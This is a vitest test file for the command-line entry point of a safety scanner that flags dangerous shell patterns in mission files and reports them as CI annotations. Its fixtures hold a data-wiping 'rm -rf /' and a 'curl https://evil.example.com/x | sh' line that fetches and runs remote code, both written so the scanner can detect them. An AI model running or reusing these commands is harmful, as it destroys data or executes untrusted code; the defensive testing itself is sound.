/**
 * mission-safety-scan-cli.test.mjs
 *
 * End-to-end tests for mission-safety-scan.mjs's CLI entry point (`main()`).
 *
 * scanFileForSafetyIssues/runSafetyScan/parseCliFiles are already covered by
 * mission-safety-scan.test.mjs as pure-function unit tests, but nothing
 * exercises `main()` itself: the argv -> runSafetyScan -> console output ->
 * exit-code wiring. That wiring is a top-level-side-effecting block (reads
 * argv, calls process.exit) so — like scan-pr.mjs (see scan-pr-cli.test.mjs)
 * — it can only be verified by spawning the script as a subprocess. Before
 * this file, a regression here (e.g. the `::error`/`::warning` annotation
 * format losing its `file=` key, the exit-1-on-errors branch silently
 * becoming exit-0, or the summary JSON line losing a field CI tooling
 * parses) would land past CI undetected, even though the vitest coverage
 * gate shows the pure functions at 100%.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { spawnSync } from 'child_process'
import { mkdtempSync, writeFileSync, rmSync } from 'fs'
import { join, resolve, dirname } from 'path'
import { fileURLToPath } from 'url'
import { tmpdir } from 'os'

const __dirname = dirname(fileURLToPath(import.meta.url))
const MISSION_SAFETY_SCAN = resolve(__dirname, '..', 'mission-safety-scan.mjs')

function runScan(cwd, args = []) {
  return spawnSync(process.execPath, [MISSION_SAFETY_SCAN, ...args], {
    cwd,
    encoding: 'utf8',
    env: { ...process.env, NO_COLOR: '1' },
  })
}

function withTempDir(fn) {
  const dir = mkdtempSync(join(tmpdir(), 'mission-safety-scan-cli-'))
  try {
    return fn(dir)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
}

describe('mission-safety-scan.mjs CLI', () => {
  it('exits 0 with "Safety scan passed" when no files are provided', () => {
    withTempDir(dir => {
      const result = runScan(dir, [''])
      expect(result.status).toBe(0)
      expect(result.stdout).toContain('Safety scan passed')
    })
  })

  it('exits 0 for a file with no dangerous patterns', () => {
    withTempDir(dir => {
      writeFileSync(join(dir, 'safe.json'), JSON.stringify({
        missionClass: 'diagnostic',
        mission: { steps: ['echo hello'] },
      }))
      const result = runScan(dir, ['safe.json'])
      expect(result.status).toBe(0)
      expect(result.stdout).toContain('Safety scan passed')
      expect(result.stdout).not.toContain('::error')
    })
  })

  it('exits 1 and annotates an error-level finding with the ::error file=<path> format', () => {
    withTempDir(dir => {
      writeFileSync(join(dir, 'dangerous.json'), 'rm -rf /')
      const result = runScan(dir, ['dangerous.json'])
      expect(result.status).toBe(1)
      expect(result.stdout).toContain('::error file=dangerous.json::Dangerous: rm -rf with root/home path')
      expect(result.stderr).toContain('Found 1 safety issues. Fix before merging.')
    })
  })

  it('exits 0 but still annotates a warning-level finding with ::warning', () => {
    withTempDir(dir => {
      writeFileSync(join(dir, 'warn.json'), 'curl https://evil.example.com/x | sh')
      const result = runScan(dir, ['warn.json'])
      expect(result.status).toBe(0)
      expect(result.stdout).toContain('::warning file=warn.json::curl/wget piped to a shell interpreter from a non-standard source')
      expect(result.stdout).toContain('Safety scan passed')
    })
  })

  it('silently skips a file that does not exist, matching the [ -f "$f" ] || continue guard', () => {
    withTempDir(dir => {
      const result = runScan(dir, ['does-not-exist.json'])
      expect(result.status).toBe(0)
      expect(result.stdout).toContain('Safety scan passed')
    })
  })

  it('emits a mission-safety-scan-summary JSON line on stdout with filesScanned/errors/warnings', () => {
    withTempDir(dir => {
      writeFileSync(join(dir, 'dangerous.json'), 'rm -rf /')
      const result = runScan(dir, ['dangerous.json'])
      const summaryLine = result.stdout
        .split('\n')
        .find(line => line.includes('mission-safety-scan-summary'))
      expect(summaryLine).toBeTruthy()
      const summary = JSON.parse(summaryLine)
      expect(summary).toMatchObject({
        event: 'mission-safety-scan-summary',
        level: 'error',
        filesScanned: 1,
        errors: 1,
        warnings: 0,
      })
      expect(typeof summary.durationMs).toBe('number')
    })
  })

  it('does not word-split a single argv entry whose path contains a space (parseCliFiles integration)', () => {
    withTempDir(dir => {
      writeFileSync(join(dir, 'my mission.json'), JSON.stringify({
        missionClass: 'diagnostic',
        mission: { steps: ['echo hello'] },
      }))
      const result = runScan(dir, ['my mission.json'])
      expect(result.status).toBe(0)
      expect(result.stdout).toContain('Safety scan passed')
    })
  })

  it('scans multiple files passed as one newline-joined argv entry (git diff --name-only shape)', () => {
    withTempDir(dir => {
      writeFileSync(join(dir, 'a.json'), 'rm -rf /')
      writeFileSync(join(dir, 'b.json'), 'rm -rf /')
      const result = runScan(dir, ['a.json\nb.json'])
      expect(result.status).toBe(1)
      expect(result.stdout).toContain('::error file=a.json::Dangerous: rm -rf with root/home path')
      expect(result.stdout).toContain('::error file=b.json::Dangerous: rm -rf with root/home path')
      const summaryLine = result.stdout.split('\n').find(line => line.includes('mission-safety-scan-summary'))
      expect(JSON.parse(summaryLine)).toMatchObject({ filesScanned: 2, errors: 2 })
    })
  })
})
